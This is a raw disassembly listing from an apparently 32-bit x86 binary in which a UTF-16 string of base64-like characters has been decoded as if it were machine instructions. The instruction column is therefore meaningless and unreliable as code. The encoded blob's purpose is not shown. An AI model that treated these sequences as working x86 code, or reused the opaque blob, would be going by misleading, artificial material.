  40aea6:	4e                   	dec    %esi
  40aea7:	00 38                	add    %bh,(%eax)
  40aea9:	00 4b 00             	add    %cl,0x0(%ebx)
  40aeac:	5a                   	pop    %edx
  40aead:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40aeb1:	00 6f 00             	add    %ch,0x0(%edi)
  40aeb4:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40aeb8:	4b                   	dec    %ebx
  40aeb9:	00 69 00             	add    %ch,0x0(%ecx)
  40aebc:	6a 00                	push   $0x0
  40aebe:	74 00                	je     0x40aec0
  40aec0:	2b 00                	sub    (%eax),%eax
  40aec2:	38 00                	cmp    %al,(%eax)
  40aec4:	4f                   	dec    %edi
  40aec5:	00 65 00             	add    %ah,0x0(%ebp)
  40aec8:	4a                   	dec    %edx
  40aec9:	00 30                	add    %dh,(%eax)
  40aecb:	00 38                	add    %bh,(%eax)
  40aecd:	00 73 00             	add    %dh,0x0(%ebx)
  40aed0:	61                   	popa
  40aed1:	00 66 00             	add    %ah,0x0(%esi)
  40aed4:	70 00                	jo     0x40aed6
  40aed6:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40aeda:	56                   	push   %esi
  40aedb:	00 35 00 33 00 34    	add    %dh,0x34003300
  40aee1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aee4:	79 00                	jns    0x40aee6
  40aee6:	78 00                	js     0x40aee8
  40aee8:	4e                   	dec    %esi
  40aee9:	00 2b                	add    %ch,(%ebx)
  40aeeb:	00 58 00             	add    %bl,0x0(%eax)
  40aeee:	63 00                	arpl   %eax,(%eax)
  40aef0:	5a                   	pop    %edx
  40aef1:	00 49 00             	add    %cl,0x0(%ecx)
  40aef4:	49                   	dec    %ecx
  40aef5:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40aef9:	00 72 00             	add    %dh,0x0(%edx)
  40aefc:	53                   	push   %ebx
  40aefd:	00 65 00             	add    %ah,0x0(%ebp)
  40af00:	4c                   	dec    %esp
  40af01:	00 78 00             	add    %bh,0x0(%eax)
  40af04:	46                   	inc    %esi
  40af05:	00 65 00             	add    %ah,0x0(%ebp)
  40af08:	53                   	push   %ebx
  40af09:	00 43 00             	add    %al,0x0(%ebx)
  40af0c:	6d                   	insl   (%dx),%es:(%edi)
  40af0d:	00 6d 00             	add    %ch,0x0(%ebp)
  40af10:	4e                   	dec    %esi
  40af11:	00 68 00             	add    %ch,0x0(%eax)
  40af14:	77 00                	ja     0x40af16
  40af16:	52                   	push   %edx
  40af17:	00 30                	add    %dh,(%eax)
  40af19:	00 6b 00             	add    %ch,0x0(%ebx)
  40af1c:	70 00                	jo     0x40af1e
  40af1e:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40af22:	4c                   	dec    %esp
  40af23:	00 41 00             	add    %al,0x0(%ecx)
  40af26:	34 00                	xor    $0x0,%al
  40af28:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40af2b:	00 79 00             	add    %bh,0x0(%ecx)
  40af2e:	48                   	dec    %eax
  40af2f:	00 75 00             	add    %dh,0x0(%ebp)
  40af32:	5a                   	pop    %edx
  40af33:	00 39                	add    %bh,(%ecx)
  40af35:	00 4a 00             	add    %cl,0x0(%edx)
  40af38:	6a 00                	push   $0x0
  40af3a:	74 00                	je     0x40af3c
  40af3c:	7a 00                	jp     0x40af3e
  40af3e:	53                   	push   %ebx
  40af3f:	00 67 00             	add    %ah,0x0(%edi)
  40af42:	4f                   	dec    %edi
  40af43:	00 45 00             	add    %al,0x0(%ebp)
  40af46:	47                   	inc    %edi
  40af47:	00 78 00             	add    %bh,0x0(%eax)
  40af4a:	4f                   	dec    %edi
  40af4b:	00 45 00             	add    %al,0x0(%ebp)
  40af4e:	4f                   	dec    %edi
  40af4f:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40af53:	00 79 00             	add    %bh,0x0(%ecx)
  40af56:	36 00 37             	add    %dh,%ss:(%edi)
  40af59:	00 32                	add    %dh,(%edx)
  40af5b:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  40af5f:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40af63:	00 70 00             	add    %dh,0x0(%eax)
  40af66:	44                   	inc    %esp
  40af67:	00 46 00             	add    %al,0x0(%esi)
  40af6a:	43                   	inc    %ebx
  40af6b:	00 52 00             	add    %dl,0x0(%edx)
  40af6e:	4d                   	dec    %ebp
  40af6f:	00 56 00             	add    %dl,0x0(%esi)
  40af72:	4d                   	dec    %ebp
  40af73:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af76:	4f                   	dec    %edi
  40af77:	00 72 00             	add    %dh,0x0(%edx)
  40af7a:	64 00 4c 00 59       	add    %cl,%fs:0x59(%eax,%eax,1)
  40af7f:	00 72 00             	add    %dh,0x0(%edx)
  40af82:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40af86:	78 00                	js     0x40af88
  40af88:	2f                   	das
  40af89:	00 4f 00             	add    %cl,0x0(%edi)
  40af8c:	38 00                	cmp    %al,(%eax)
  40af8e:	35 00 70 00 41       	xor    $0x41007000,%eax
  40af93:	00 76 00             	add    %dh,0x0(%esi)
  40af96:	46                   	inc    %esi
  40af97:	00 51 00             	add    %dl,0x0(%ecx)
  40af9a:	79 00                	jns    0x40af9c
  40af9c:	68 00 34 00 41       	push   $0x41003400
  40afa1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40afa5:	00 30                	add    %dh,(%eax)
  40afa7:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40afab:	00 32                	add    %dh,(%edx)
  40afad:	00 68 00             	add    %ch,0x0(%eax)
  40afb0:	31 00                	xor    %eax,(%eax)
  40afb2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40afb6:	6c                   	insb   (%dx),%es:(%edi)
  40afb7:	00 70 00             	add    %dh,0x0(%eax)
  40afba:	67 00 36 00 37       	add    %dh,0x3700
  40afbf:	00 6b 00             	add    %ch,0x0(%ebx)
  40afc2:	6a 00                	push   $0x0
  40afc4:	4a                   	dec    %edx
  40afc5:	00 66 00             	add    %ah,0x0(%esi)
  40afc8:	58                   	pop    %eax
  40afc9:	00 53 00             	add    %dl,0x0(%ebx)
  40afcc:	67 00 65 00          	add    %ah,0x0(%di)
  40afd0:	32 00                	xor    (%eax),%al
  40afd2:	4c                   	dec    %esp
  40afd3:	00 71 00             	add    %dh,0x0(%ecx)
  40afd6:	57                   	push   %edi
  40afd7:	00 56 00             	add    %dl,0x0(%esi)
  40afda:	52                   	push   %edx
  40afdb:	00 46 00             	add    %al,0x0(%esi)
  40afde:	62 00                	bound  %eax,(%eax)
  40afe0:	52                   	push   %edx
  40afe1:	00 6f 00             	add    %ch,0x0(%edi)
  40afe4:	61                   	popa
  40afe5:	00 31                	add    %dh,(%ecx)
  40afe7:	00 67 00             	add    %ah,0x0(%edi)
  40afea:	41                   	inc    %ecx
  40afeb:	00 65 00             	add    %ah,0x0(%ebp)
  40afee:	4d                   	dec    %ebp
  40afef:	00 48 00             	add    %cl,0x0(%eax)
  40aff2:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40aff6:	43                   	inc    %ebx
  40aff7:	00 31                	add    %dh,(%ecx)
  40aff9:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40affd:	00 72 00             	add    %dh,0x0(%edx)
  40b000:	59                   	pop    %ecx
  40b001:	00 4b 00             	add    %cl,0x0(%ebx)
  40b004:	4e                   	dec    %esi
  40b005:	00 66 00             	add    %ah,0x0(%esi)
  40b008:	71 00                	jno    0x40b00a
  40b00a:	2b 00                	sub    (%eax),%eax
  40b00c:	61                   	popa
  40b00d:	00 61 00             	add    %ah,0x0(%ecx)
  40b010:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b014:	52                   	push   %edx
  40b015:	00 70 00             	add    %dh,0x0(%eax)
  40b018:	43                   	inc    %ebx
  40b019:	00 75 00             	add    %dh,0x0(%ebp)
  40b01c:	6b 00 68             	imul   $0x68,(%eax),%eax
  40b01f:	00 41 00             	add    %al,0x0(%ecx)
  40b022:	4b                   	dec    %ebx
  40b023:	00 2b                	add    %ch,(%ebx)
  40b025:	00 37                	add    %dh,(%edi)
  40b027:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40b02b:	00 6f 00             	add    %ch,0x0(%edi)
  40b02e:	53                   	push   %ebx
  40b02f:	00 55 00             	add    %dl,0x0(%ebp)
  40b032:	49                   	dec    %ecx
  40b033:	00 68 00             	add    %ch,0x0(%eax)
  40b036:	61                   	popa
  40b037:	00 4e 00             	add    %cl,0x0(%esi)
  40b03a:	31 00                	xor    %eax,(%eax)
  40b03c:	52                   	push   %edx
  40b03d:	00 69 00             	add    %ch,0x0(%ecx)
  40b040:	56                   	push   %esi
  40b041:	00 47 00             	add    %al,0x0(%edi)
  40b044:	41                   	inc    %ecx
  40b045:	00 75 00             	add    %dh,0x0(%ebp)
  40b048:	32 00                	xor    (%eax),%al
  40b04a:	6c                   	insb   (%dx),%es:(%edi)
  40b04b:	00 38                	add    %bh,(%eax)
  40b04d:	00 65 00             	add    %ah,0x0(%ebp)
  40b050:	68 00 43 00 66       	push   $0x66004300
  40b055:	00 35 00 55 00 6d    	add    %dh,0x6d005500
  40b05b:	00 4f 00             	add    %cl,0x0(%edi)
  40b05e:	72 00                	jb     0x40b060
  40b060:	62 00                	bound  %eax,(%eax)
  40b062:	76 00                	jbe    0x40b064
  40b064:	4d                   	dec    %ebp
  40b065:	00 61 00             	add    %ah,0x0(%ecx)
  40b068:	6d                   	insl   (%dx),%es:(%edi)
  40b069:	00 31                	add    %dh,(%ecx)
  40b06b:	00 49 00             	add    %cl,0x0(%ecx)
  40b06e:	68 00 65 00 56       	push   $0x56006500
  40b073:	00 66 00             	add    %ah,0x0(%esi)
  40b076:	67 00 36 00 37       	add    %dh,0x3700
  40b07b:	00 56 00             	add    %dl,0x0(%esi)
  40b07e:	4d                   	dec    %ebp
  40b07f:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40b083:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b086:	64 00 36             	add    %dh,%fs:(%esi)
  40b089:	00 6d 00             	add    %ch,0x0(%ebp)
  40b08c:	71 00                	jno    0x40b08e
  40b08e:	58                   	pop    %eax
  40b08f:	00 47 00             	add    %al,0x0(%edi)
  40b092:	6f                   	outsl  %ds:(%esi),(%dx)
  40b093:	00 4b 00             	add    %cl,0x0(%ebx)
  40b096:	67 00 2b             	add    %ch,(%bp,%di)
  40b099:	00 70 00             	add    %dh,0x0(%eax)
  40b09c:	4d                   	dec    %ebp
  40b09d:	00 58 00             	add    %bl,0x0(%eax)
  40b0a0:	79 00                	jns    0x40b0a2
  40b0a2:	64 00 39             	add    %bh,%fs:(%ecx)
  40b0a5:	00 71 00             	add    %dh,0x0(%ecx)
  40b0a8:	49                   	dec    %ecx
  40b0a9:	00 78 00             	add    %bh,0x0(%eax)
  40b0ac:	66 00 74 00 6d       	data16 add %dh,0x6d(%eax,%eax,1)
  40b0b1:	00 65 00             	add    %ah,0x0(%ebp)
  40b0b4:	77 00                	ja     0x40b0b6
  40b0b6:	45                   	inc    %ebp
  40b0b7:	00 48 00             	add    %cl,0x0(%eax)
  40b0ba:	37                   	aaa
  40b0bb:	00 5a 00             	add    %bl,0x0(%edx)
  40b0be:	65 00 6c 00 67       	add    %ch,%gs:0x67(%eax,%eax,1)
  40b0c3:	00 77 00             	add    %dh,0x0(%edi)
  40b0c6:	37                   	aaa
  40b0c7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0ca:	6c                   	insb   (%dx),%es:(%edi)
  40b0cb:	00 57 00             	add    %dl,0x0(%edi)
  40b0ce:	56                   	push   %esi
  40b0cf:	00 69 00             	add    %ch,0x0(%ecx)
  40b0d2:	52                   	push   %edx
  40b0d3:	00 55 00             	add    %dl,0x0(%ebp)
  40b0d6:	79 00                	jns    0x40b0d8
  40b0d8:	62 00                	bound  %eax,(%eax)
  40b0da:	67 00 38             	add    %bh,(%bx,%si)
  40b0dd:	00 70 00             	add    %dh,0x0(%eax)
  40b0e0:	41                   	inc    %ecx
  40b0e1:	00 39                	add    %bh,(%ecx)
  40b0e3:	00 75 00             	add    %dh,0x0(%ebp)
  40b0e6:	46                   	inc    %esi
  40b0e7:	00 69 00             	add    %ch,0x0(%ecx)
  40b0ea:	4f                   	dec    %edi
  40b0eb:	00 57 00             	add    %dl,0x0(%edi)
  40b0ee:	67 00 2f             	add    %ch,(%bx)
  40b0f1:	00 30                	add    %dh,(%eax)
  40b0f3:	00 2f                	add    %ch,(%edi)
  40b0f5:	00 30                	add    %dh,(%eax)
  40b0f7:	00 39                	add    %bh,(%ecx)
  40b0f9:	00 2f                	add    %ch,(%edi)
  40b0fb:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b0ff:	00 63 00             	add    %ah,0x0(%ebx)
  40b102:	35 00 48 00 6d       	xor    $0x6d004800,%eax
  40b107:	00 46 00             	add    %al,0x0(%esi)
  40b10a:	37                   	aaa
  40b10b:	00 45 00             	add    %al,0x0(%ebp)
  40b10e:	50                   	push   %eax
  40b10f:	00 73 00             	add    %dh,0x0(%ebx)
  40b112:	34 00                	xor    $0x0,%al
  40b114:	46                   	inc    %esi
  40b115:	00 39                	add    %bh,(%ecx)
  40b117:	00 6a 00             	add    %ch,0x0(%edx)
  40b11a:	71 00                	jno    0x40b11c
  40b11c:	76 00                	jbe    0x40b11e
  40b11e:	38 00                	cmp    %al,(%eax)
  40b120:	56                   	push   %esi
  40b121:	00 48 00             	add    %cl,0x0(%eax)
  40b124:	6a 00                	push   $0x0
  40b126:	5a                   	pop    %edx
  40b127:	00 68 00             	add    %ch,0x0(%eax)
  40b12a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b12b:	00 52 00             	add    %dl,0x0(%edx)
  40b12e:	44                   	inc    %esp
  40b12f:	00 51 00             	add    %dl,0x0(%ecx)
  40b132:	44                   	inc    %esp
  40b133:	00 39                	add    %bh,(%ecx)
  40b135:	00 76 00             	add    %dh,0x0(%esi)
  40b138:	76 00                	jbe    0x40b13a
  40b13a:	4d                   	dec    %ebp
  40b13b:	00 41 00             	add    %al,0x0(%ecx)
  40b13e:	33 00                	xor    (%eax),%eax
  40b140:	79 00                	jns    0x40b142
  40b142:	68 00 51 00 4d       	push   $0x4d005100
  40b147:	00 30                	add    %dh,(%eax)
  40b149:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40b14d:	00 2f                	add    %ch,(%edi)
  40b14f:	00 68 00             	add    %ch,0x0(%eax)
  40b152:	46                   	inc    %esi
  40b153:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40b157:	00 79 00             	add    %bh,0x0(%ecx)
  40b15a:	32 00                	xor    (%eax),%al
  40b15c:	4d                   	dec    %ebp
  40b15d:	00 58 00             	add    %bl,0x0(%eax)
  40b160:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40b164:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40b168:	47                   	inc    %edi
  40b169:	00 77 00             	add    %dh,0x0(%edi)
  40b16c:	43                   	inc    %ebx
  40b16d:	00 6f 00             	add    %ch,0x0(%edi)
  40b170:	68 00 45 00 37       	push   $0x37004500
  40b175:	00 5a 00             	add    %bl,0x0(%edx)
  40b178:	41                   	inc    %ecx
  40b179:	00 31                	add    %dh,(%ecx)
  40b17b:	00 35 00 67 00 49    	add    %dh,0x49006700
  40b181:	00 6e 00             	add    %ch,0x0(%esi)
  40b184:	55                   	push   %ebp
  40b185:	00 4a 00             	add    %cl,0x0(%edx)
  40b188:	55                   	push   %ebp
  40b189:	00 72 00             	add    %dh,0x0(%edx)
  40b18c:	59                   	pop    %ecx
  40b18d:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b191:	00 77 00             	add    %dh,0x0(%edi)
  40b194:	31 00                	xor    %eax,(%eax)
  40b196:	2b 00                	sub    (%eax),%eax
  40b198:	7a 00                	jp     0x40b19a
  40b19a:	43                   	inc    %ebx
  40b19b:	00 50 00             	add    %dl,0x0(%eax)
  40b19e:	76 00                	jbe    0x40b1a0
  40b1a0:	51                   	push   %ecx
  40b1a1:	00 52 00             	add    %dl,0x0(%edx)
  40b1a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1a5:	00 70 00             	add    %dh,0x0(%eax)
  40b1a8:	2f                   	das
  40b1a9:	00 39                	add    %bh,(%ecx)
  40b1ab:	00 77 00             	add    %dh,0x0(%edi)
  40b1ae:	78 00                	js     0x40b1b0
  40b1b0:	59                   	pop    %ecx
  40b1b1:	00 35 00 36 00 73    	add    %dh,0x73003600
  40b1b7:	00 6a 00             	add    %ch,0x0(%edx)
  40b1ba:	71 00                	jno    0x40b1bc
  40b1bc:	57                   	push   %edi
  40b1bd:	00 56 00             	add    %dl,0x0(%esi)
  40b1c0:	4d                   	dec    %ebp
  40b1c1:	00 73 00             	add    %dh,0x0(%ebx)
  40b1c4:	78 00                	js     0x40b1c6
  40b1c6:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b1ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1cb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1ce:	36 00 2f             	add    %ch,%ss:(%edi)
  40b1d1:	00 73 00             	add    %dh,0x0(%ebx)
  40b1d4:	41                   	inc    %ecx
  40b1d5:	00 31                	add    %dh,(%ecx)
  40b1d7:	00 47 00             	add    %al,0x0(%edi)
  40b1da:	53                   	push   %ebx
  40b1db:	00 59 00             	add    %bl,0x0(%ecx)
  40b1de:	50                   	push   %eax
  40b1df:	00 46 00             	add    %al,0x0(%esi)
  40b1e2:	74 00                	je     0x40b1e4
  40b1e4:	33 00                	xor    (%eax),%eax
  40b1e6:	75 00                	jne    0x40b1e8
  40b1e8:	49                   	dec    %ecx
  40b1e9:	00 39                	add    %bh,(%ecx)
  40b1eb:	00 63 00             	add    %ah,0x0(%ebx)
  40b1ee:	56                   	push   %esi
  40b1ef:	00 41 00             	add    %al,0x0(%ecx)
  40b1f2:	38 00                	cmp    %al,(%eax)
  40b1f4:	34 00                	xor    $0x0,%al
  40b1f6:	59                   	pop    %ecx
  40b1f7:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1fa:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40b1fe:	74 00                	je     0x40b200
  40b200:	6a 00                	push   $0x0
  40b202:	4d                   	dec    %ebp
  40b203:	00 39                	add    %bh,(%ecx)
  40b205:	00 39                	add    %bh,(%ecx)
  40b207:	00 39                	add    %bh,(%ecx)
  40b209:	00 78 00             	add    %bh,0x0(%eax)
  40b20c:	50                   	push   %eax
  40b20d:	00 78 00             	add    %bh,0x0(%eax)
  40b210:	31 00                	xor    %eax,(%eax)
  40b212:	69 00 42 00 6d 00    	imul   $0x6d0042,(%eax),%eax
  40b218:	73 00                	jae    0x40b21a
  40b21a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b21b:	00 68 00             	add    %ch,0x0(%eax)
  40b21e:	48                   	dec    %eax
  40b21f:	00 4d 00             	add    %cl,0x0(%ebp)
  40b222:	42                   	inc    %edx
  40b223:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40b227:	00 52 00             	add    %dl,0x0(%edx)
  40b22a:	34 00                	xor    $0x0,%al
  40b22c:	70 00                	jo     0x40b22e
  40b22e:	30 00                	xor    %al,(%eax)
  40b230:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b234:	4b                   	dec    %ebx
  40b235:	00 30                	add    %dh,(%eax)
  40b237:	00 51 00             	add    %dl,0x0(%ecx)
  40b23a:	4d                   	dec    %ebp
  40b23b:	00 49 00             	add    %cl,0x0(%ecx)
  40b23e:	4b                   	dec    %ebx
  40b23f:	00 4e 00             	add    %cl,0x0(%esi)
  40b242:	6d                   	insl   (%dx),%es:(%edi)
  40b243:	00 2b                	add    %ch,(%ebx)
  40b245:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40b249:	00 33                	add    %dh,(%ebx)
  40b24b:	00 53 00             	add    %dl,0x0(%ebx)
  40b24e:	2b 00                	sub    (%eax),%eax
  40b250:	36 00 37             	add    %dh,%ss:(%edi)
  40b253:	00 62 00             	add    %ah,0x0(%edx)
  40b256:	6a 00                	push   $0x0
  40b258:	52                   	push   %edx
  40b259:	00 77 00             	add    %dh,0x0(%edi)
  40b25c:	2f                   	das
  40b25d:	00 77 00             	add    %dh,0x0(%edi)
  40b260:	53                   	push   %ebx
  40b261:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b265:	00 6d 00             	add    %ch,0x0(%ebp)
  40b268:	73 00                	jae    0x40b26a
  40b26a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b26b:	00 43 00             	add    %al,0x0(%ebx)
  40b26e:	6b 00 35             	imul   $0x35,(%eax),%eax
  40b271:	00 6d 00             	add    %ch,0x0(%ebp)
  40b274:	51                   	push   %ecx
  40b275:	00 4f 00             	add    %cl,0x0(%edi)
  40b278:	52                   	push   %edx
  40b279:	00 39                	add    %bh,(%ecx)
  40b27b:	00 70 00             	add    %dh,0x0(%eax)
  40b27e:	32 00                	xor    (%eax),%al
  40b280:	54                   	push   %esp
  40b281:	00 58 00             	add    %bl,0x0(%eax)
  40b284:	55                   	push   %ebp
  40b285:	00 49 00             	add    %cl,0x0(%ecx)
  40b288:	4c                   	dec    %esp
  40b289:	00 41 00             	add    %al,0x0(%ecx)
  40b28c:	77 00                	ja     0x40b28e
  40b28e:	47                   	inc    %edi
  40b28f:	00 68 00             	add    %ch,0x0(%eax)
  40b292:	4d                   	dec    %ebp
  40b293:	00 38                	add    %bh,(%eax)
  40b295:	00 47 00             	add    %al,0x0(%edi)
  40b298:	71 00                	jno    0x40b29a
  40b29a:	63 00                	arpl   %eax,(%eax)
  40b29c:	38 00                	cmp    %al,(%eax)
  40b29e:	75 00                	jne    0x40b2a0
  40b2a0:	51                   	push   %ecx
  40b2a1:	00 7a 00             	add    %bh,0x0(%edx)
  40b2a4:	30 00                	xor    %al,(%eax)
  40b2a6:	72 00                	jb     0x40b2a8
  40b2a8:	42                   	inc    %edx
  40b2a9:	00 78 00             	add    %bh,0x0(%eax)
  40b2ac:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40b2b0:	67 00 34             	add    %dh,(%si)
  40b2b3:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b6:	34 00                	xor    $0x0,%al
  40b2b8:	59                   	pop    %ecx
  40b2b9:	00 7a 00             	add    %bh,0x0(%edx)
  40b2bc:	4b                   	dec    %ebx
  40b2bd:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2c0:	4f                   	dec    %edi
  40b2c1:	00 32                	add    %dh,(%edx)
  40b2c3:	00 72 00             	add    %dh,0x0(%edx)
  40b2c6:	42                   	inc    %edx
  40b2c7:	00 48 00             	add    %cl,0x0(%eax)
  40b2ca:	4f                   	dec    %edi
  40b2cb:	00 49 00             	add    %cl,0x0(%ecx)
  40b2ce:	7a 00                	jp     0x40b2d0
  40b2d0:	57                   	push   %edi
  40b2d1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2d4:	47                   	inc    %edi
  40b2d5:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2d8:	39 00                	cmp    %eax,(%eax)
  40b2da:	46                   	inc    %esi
  40b2db:	00 4e 00             	add    %cl,0x0(%esi)
  40b2de:	4f                   	dec    %edi
  40b2df:	00 70 00             	add    %dh,0x0(%eax)
  40b2e2:	45                   	inc    %ebp
  40b2e3:	00 52 00             	add    %dl,0x0(%edx)
  40b2e6:	4a                   	dec    %edx
  40b2e7:	00 41 00             	add    %al,0x0(%ecx)
  40b2ea:	45                   	inc    %ebp
  40b2eb:	00 47 00             	add    %al,0x0(%edi)
  40b2ee:	45                   	inc    %ebp
  40b2ef:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2f2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2f3:	00 32                	add    %dh,(%edx)
  40b2f5:	00 55 00             	add    %dl,0x0(%ebp)
  40b2f8:	6d                   	insl   (%dx),%es:(%edi)
  40b2f9:	00 46 00             	add    %al,0x0(%esi)
  40b2fc:	41                   	inc    %ecx
  40b2fd:	00 53 00             	add    %dl,0x0(%ebx)
  40b300:	31 00                	xor    %eax,(%eax)
  40b302:	32 00                	xor    (%eax),%al
  40b304:	77 00                	ja     0x40b306
  40b306:	67 00 32             	add    %dh,(%bp,%si)
  40b309:	00 58 00             	add    %bl,0x0(%eax)
  40b30c:	5a                   	pop    %edx
  40b30d:	00 30                	add    %dh,(%eax)
  40b30f:	00 62 00             	add    %ah,0x0(%edx)
  40b312:	57                   	push   %edi
  40b313:	00 50 00             	add    %dl,0x0(%eax)
  40b316:	6a 00                	push   $0x0
  40b318:	39 00                	cmp    %eax,(%eax)
  40b31a:	74 00                	je     0x40b31c
  40b31c:	77 00                	ja     0x40b31e
  40b31e:	71 00                	jno    0x40b320
  40b320:	69 00 39 00 5a 00    	imul   $0x5a0039,(%eax),%eax
  40b326:	32 00                	xor    (%eax),%al
  40b328:	68 00 64 00 6f       	push   $0x6f006400
  40b32d:	00 6e 00             	add    %ch,0x0(%esi)
  40b330:	42                   	inc    %edx
  40b331:	00 51 00             	add    %dl,0x0(%ecx)
  40b334:	6d                   	insl   (%dx),%es:(%edi)
  40b335:	00 41 00             	add    %al,0x0(%ecx)
  40b338:	42                   	inc    %edx
  40b339:	00 77 00             	add    %dh,0x0(%edi)
  40b33c:	64 00 39             	add    %bh,%fs:(%ecx)
  40b33f:	00 38                	add    %bh,(%eax)
  40b341:	00 35 00 68 00 4e    	add    %dh,0x4e006800
  40b347:	00 49 00             	add    %cl,0x0(%ecx)
  40b34a:	39 00                	cmp    %eax,(%eax)
  40b34c:	75 00                	jne    0x40b34e
  40b34e:	7a 00                	jp     0x40b350
  40b350:	76 00                	jbe    0x40b352
  40b352:	59                   	pop    %ecx
  40b353:	00 35 00 76 00 5a    	add    %dh,0x5a007600
  40b359:	00 68 00             	add    %ch,0x0(%eax)
  40b35c:	77 00                	ja     0x40b35e
  40b35e:	73 00                	jae    0x40b360
  40b360:	56                   	push   %esi
  40b361:	00 56 00             	add    %dl,0x0(%esi)
  40b364:	50                   	push   %eax
  40b365:	00 59 00             	add    %bl,0x0(%ecx)
  40b368:	4e                   	dec    %esi
  40b369:	00 47 00             	add    %al,0x0(%edi)
  40b36c:	5a                   	pop    %edx
  40b36d:	00 7a 00             	add    %bh,0x0(%edx)
  40b370:	4e                   	dec    %esi
  40b371:	00 50 00             	add    %dl,0x0(%eax)
  40b374:	55                   	push   %ebp
  40b375:	00 66 00             	add    %ah,0x0(%esi)
  40b378:	75 00                	jne    0x40b37a
  40b37a:	6d                   	insl   (%dx),%es:(%edi)
  40b37b:	00 52 00             	add    %dl,0x0(%edx)
  40b37e:	37                   	aaa
  40b37f:	00 5a 00             	add    %bl,0x0(%edx)
  40b382:	4d                   	dec    %ebp
  40b383:	00 50 00             	add    %dl,0x0(%eax)
  40b386:	58                   	pop    %eax
  40b387:	00 35 00 66 00 59    	add    %dh,0x59006600
  40b38d:	00 2b                	add    %ch,(%ebx)
  40b38f:	00 67 00             	add    %ah,0x0(%edi)
  40b392:	5a                   	pop    %edx
  40b393:	00 57 00             	add    %dl,0x0(%edi)
  40b396:	57                   	push   %edi
  40b397:	00 55 00             	add    %dl,0x0(%ebp)
  40b39a:	31 00                	xor    %eax,(%eax)
  40b39c:	34 00                	xor    $0x0,%al
  40b39e:	73 00                	jae    0x40b3a0
  40b3a0:	56                   	push   %esi
  40b3a1:	00 7a 00             	add    %bh,0x0(%edx)
  40b3a4:	76 00                	jbe    0x40b3a6
  40b3a6:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40b3aa:	51                   	push   %ecx
  40b3ab:	00 36                	add    %dh,(%esi)
  40b3ad:	00 51 00             	add    %dl,0x0(%ecx)
  40b3b0:	2b 00                	sub    (%eax),%eax
  40b3b2:	49                   	dec    %ecx
  40b3b3:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3b6:	46                   	inc    %esi
  40b3b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3ba:	75 00                	jne    0x40b3bc
  40b3bc:	2f                   	das
  40b3bd:	00 37                	add    %dh,(%edi)
  40b3bf:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40b3c3:	00 75 00             	add    %dh,0x0(%ebp)
  40b3c6:	4f                   	dec    %edi
  40b3c7:	00 52 00             	add    %dl,0x0(%edx)
  40b3ca:	78 00                	js     0x40b3cc
  40b3cc:	2f                   	das
  40b3cd:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b3d1:	00 33                	add    %dh,(%ebx)
  40b3d3:	00 4f 00             	add    %cl,0x0(%edi)
  40b3d6:	5a                   	pop    %edx
  40b3d7:	00 31                	add    %dh,(%ecx)
  40b3d9:	00 6f 00             	add    %ch,0x0(%edi)
  40b3dc:	34 00                	xor    $0x0,%al
  40b3de:	39 00                	cmp    %eax,(%eax)
  40b3e0:	45                   	inc    %ebp
  40b3e1:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40b3e5:	00 67 00             	add    %ah,0x0(%edi)
  40b3e8:	49                   	dec    %ecx
  40b3e9:	00 68 00             	add    %ch,0x0(%eax)
  40b3ec:	56                   	push   %esi
  40b3ed:	00 46 00             	add    %al,0x0(%esi)
  40b3f0:	78 00                	js     0x40b3f2
  40b3f2:	69 00 65 00 58 00    	imul   $0x580065,(%eax),%eax
  40b3f8:	46                   	inc    %esi
